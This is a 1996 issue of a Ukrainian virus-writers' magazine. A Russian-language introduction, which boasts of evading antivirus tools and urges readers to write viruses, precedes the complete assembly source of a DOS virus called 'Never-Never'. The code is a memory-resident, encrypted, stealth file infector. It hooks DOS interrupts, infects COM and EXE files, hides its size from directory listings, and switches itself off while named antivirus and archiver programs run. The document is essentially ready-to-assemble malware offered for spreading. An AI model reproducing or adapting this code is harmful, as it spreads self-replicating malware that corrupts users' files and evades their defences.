;      ▄▄                  █
;     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV  1996
;     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
;      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █▀▀█ █ 
;       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▀▀▀█ █
;       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █▄▄█ █
;       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
;       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.

;Добрый день (вечер, ночь, утро ) дорогие товарищи (граждане, господа, мистеры и
;прочие прочие прочие .... Я рад снова приветствовать Вас на электронных
;страницах нашего журнала, теперь уже в новом, надеюсь и далеко не последнем ;),
;году. Много много пива, шампанского, водки, текилы и прочего боржоми утекло
;с момента выпуска 8 номера журнала и вот теперь, слегка протрезвев и немного
;очнувшись от бесконечной гряды непрекращаюшихся праздников я решил
;порадовать всех наших читателей новыми результатами моей непрекращающейся
;работы по реализации чего-то нового и освоению классического.
;Я представляю на ваше рассмотрение небольшой - 1000 байт RCE. Скромный такой
;вирус, с массой багов, без деструкции, по крайней мере умышленной. Стелс.
;4e/4f - скрытие длинны. по 3d - из .COM выкусывается тело вируса. по 3e -
;заражение всяких там .EXE неоверлейных и .COM. По запуске adiNF,drwEB,
;aidsteST,scAN,aRJ,pkunzIP,rAR,HA выключаемся в памяти (временно). по 4c -
;снова включаемся, это чтобы адинф не вопил СТЕЛС-СТЕЛС и архиваторы правильно
;файлы сжимали и web с аидстестом файлы не портили. При заражении всех
;вышеуказанных прог при их запуске обнуляется path в окружении, чтобы web и
;adinf не сказали об изменении длинны ( чтобы нервы людям не портили ).
;При запуске зараженной проги, когда вируса в памяти еще нет, вирус
;копируется в память и активизируется только после завершения проги -
;(мало-ли откуда нас запустили). ;не заражает COmmand.COm.
; Вирус элементарно xor/add шифрованый, с довольно
;скромным (из моей-то коллекции !!! ) антиэвристическим приемом, но у меня
;web 3.10 со всякими там параноическими наворотами говорит "йок !!!" на
;каждый зараженный файл. Пишите вирусы, празднуйте праздники и с головой
;будет то так то эдак и это весьма весело я вам скажу. :))))))))
;Вперед, к звездам и пусть попадает со стульев весь "дИaЛOх", увидев ваш вирус.
;
;                                   (c) Int O`Dream 1996

.286
.model tiny
.code
org 100h
start:
nop
nop
call @@8
@@8:
pop bp
sub bp,5

mov bx,0
kod equ $-2
lea di,begin-100h
mov cx,len_codir/2+1
asd:
xor cs:[bp+di],bx
inc di

in ax,42h
mov si,ax
in ax,42h
cmp ax,si
jnz hahaha
db  'дАнИлОфФ-дУб,wEb-ГоРбУхА'
hahaha:
inc di
db 81h,0c3h,0,0 ; add bx,0
dob equ $-2
loop asd
_begin equ $-start

begin:
pusha
push ds es
mov ax,1234h
int 21h
cmp ax,4321h
jz quit

mov ax,ds:[2]
sub ax,len/16+1
sub ax,10h
mov es,ax
push ds
push cs
pop ds
mov si,bp
mov di,100h
cld
mov cx,len
rep movsb

pop ds
lea di,old20
mov si,0ah
movsw
movsw
mov ds:[0ah],offset entry20
mov ds:[0ch],es

quit:
pop es ds
popa
mov ax,ds
mov bx,cs
cmp ax,bx
jnz _exe_exit
jmp _com_exit

_exe_exit:
pusha
push ds es
mov ax,word ptr es:[2ch]
mov es,ax
xor di,di
xor ax,ax
mov cx,0fffeh
repeat:
repne scasb
jne sux
scasb
jne repeat
mov al,'.'
repne scasb
jne sux
sub di,3
push cs
pop ds
lea si,non_stealth-100h+bp
mov cx,8
awa:
cmpsw
jz fu
dec di
dec di
loop awa
jmp sux
fu:
stosw
stosw
sux:
pop es ds
popa

mov ax,es
add ax,10h
add ax,0
@cs equ cs:[$-2]
push ax
mov ax,0
@ip equ cs:[$-2]
push ax
xor ax,ax
xor bx,bx
retf

_com_exit:
mov si,word ptr [cs:lena]
mov di,100h
add si,di
mov cx,len
cld
mov bx,0fch
mov word ptr cs:[bx],0a4f3h
mov word ptr cs:[bx+2],00ebh
push bx
ret

entry20:
pusha
push ds es
pushf

mov ah,48h
mov bx,(len*2)/16+1
int 21h
jc end20

sub ax,10h
mov es,ax

mov si,100h
mov di,si
push cs
pop ds
cld
mov cx,len
rep movsb

mov ax,es
add ax,15
mov ds,ax
mov word ptr ds:[1],70h
mov ax,es
mov ds,ax

mov ds,cx
mov si,21h*4
lea di,old_21
movsw
movsw
mov word ptr ds:[si-4],offset int_21
mov word ptr ds:[si-2],es

end20:
popf
pop es ds
popa

db 0eah
old20 dd 0


int_21:
cmp ah,4ch
jz final
cmp ax,1234h
jnz @2
mov ax,4321h
retf 2
@2:
cmp byte ptr cs:stealth,1
jz truble
cmp ah,4bh
jz exec
cmp ah,03eh
jnz next
jmp close
next:
cmp ah,4eh
jz find
cmp ah,4fh
jz find
cmp ah,3dh
jnz truble
jmp open
truble:
jmp @3

exec:
pusha
push es ds
push ds
pop es
push dx
pop di
mov cx,40h
mov al,'.'
cld
repne scasb
jne @888
sub di,3
push cs
pop ds
lea si,non_stealth
mov cl,8
axa:
cmpsw
jz non
dec di
dec di
loop axa
jmp @888
non:
mov byte ptr cs:stealth,1
@888:
jmp fuck

non_stealth db 'NFEBSTANRJIPHAAR'

final:
mov cs:stealth,0
jmp @3

int_24:
mov ax,0
iret

find:
call orig_21
jc end_find
pushf
push ds es
pusha
mov ah,2fh
int 21h
mov ax,word ptr es:[bx+16h]
and al,1fh
cmp al,7
jnz end_pop
sub word ptr es:[bx+1ah],len
end_pop:
popa
pop es ds
popf
end_find:
retf 2

tim dw 0
dat dw 0

open:
call orig_21
jc end_find
pushf
push ds es
pusha
xchg ax,bx
call get_sft
call check_time
jc end_pop
call read_block
jc end_pop
call save_time
jnz end_pop
mov bp,es:[di+11h]
sub bp,len
mov es:[di+15h],bp
call read_block
jc end_pop
call save_to_begin
jc end_pop
mov word ptr es:[di+11h],bp
mov word ptr es:[di+15h],0
mov al,0
call rest_time
jmp end_pop

db '[Never-Never] by Int O`Dream'
stealth db 0

close:
pusha
push es ds
call get_sft

zasa:
in ax,40h
ror ax,cl
or ax,ax
jz zasa
mov word ptr cs:kod,ax

in ax,40h
mov word ptr cs:dob,ax

mov bp,word ptr es:[di+11h]

cmp es:[di+41],'EX'
jz _exe_next
cmp es:[di+40],'OC'
jnz fuck

_com_next:
cmp es:[di+20h],'OC'
jz fuck
@as1:
cmp bp,60000
ja fuck
cmp bp,len
jb fuck

_exe_next:
call check_time
jnc fuck
mov word ptr es:[di+15h],0
call read_block
call save_time
jz fuck
cmp word ptr ds:[buf],'ZM'
jz _exe
mov word ptr es:[di+15h],bp
mov cs:lena,bp
call write_block
jc fuck
mov word ptr es:[di+15h],0

write_vir:

call crypt
call write_block
jc fuck
fuck1:
mov al,7
call rest_time
fuck:
pop ds es
popa

@3:
db 0eah
old_21 dd 0

_exe:
lastpag equ cs:[buf+2]
pagecnt equ cs:[buf+4]
hdrsize equ cs:[buf+8]
_ss     equ cs:[buf+0eh]
_sp     equ cs:[buf+10h]
chksum  equ cs:[buf+12h]
_ip     equ cs:[buf+14h]
_cs     equ cs:[buf+16h]

mov ax,word ptr pagecnt
dec ax
mov cx,512
mul cx
add ax,word ptr lastpag
cmp ax,bp
jnz fuck
cmp dx,word ptr es:[di+13h]
jnz fuck

push ax
push dx
mov cx,10h
div cx
sub ax,word ptr hdrsize
sbb dx,0
mov cx,ax
mov ax,word ptr _ip
mov word ptr cs:@ip,ax
mov ax,word ptr _cs
mov word ptr cs:@cs,ax
mov word ptr _ip,dx
mov word ptr _cs,cx
pop dx
pop ax

push ax
push dx

add ax,len
mov cx,512
div cx
inc ax
mov word ptr pagecnt,ax
mov word ptr lastpag,dx

call save_to_begin
jc fuck

pop dx
pop ax

mov word ptr es:[di+15h],ax
mov word ptr es:[di+17h],dx

jmp write_vir

save_time:
mov ax,es:[di+0dh]
mov tim,ax
mov ax,es:[di+0fh]
mov dat,ax
cmp word ptr cs:[buf],9090h
ret

rest_time:
mov cx,tim
mov dx,dat
and cl,0e0h
add cl,al
mov ax,5701h
call orig_21
ret

check_time:
mov ax,word ptr es:[di+0dh]
and al,1fh
cmp al,7
jz end_time
stc
ret
end_time:
clc
ret

db 'Киев,4:09am,31/03/96'

orig_21:
pushf
call dword ptr cs:[old_21]
ret

get_sft:
push bx
mov ax,1220h
int 2fh
mov bl,es:[di]
mov ax,1216h
int 2fh
pop bx
ret

save_to_begin:
mov word ptr es:[di+15h],0
mov word ptr es:[di+17h],0

write_block:
mov ax,2524h
lea dx,int_24
call orig_21
mov word ptr es:[di+2],2
mov ah,40h
jmp wr

read_block:
mov ah,3fh
wr:
mov cx,len
push cs
pop ds
lea dx,buf
call orig_21
ret

crypt:
mov si,100h
mov dx,word ptr kod
mov ax,word ptr dob
push ds
pop es
lea di,buf
mov cx,len
cld
rep movsb

lea di,buf+_begin
mov cx,len_codir/2+1
dfg:
xor es:[di],dx
inc di
inc di
add dx,ax
loop dfg
ret

lena  dw len
len_codir equ $-begin
len equ $-start

ret
buf:
end start
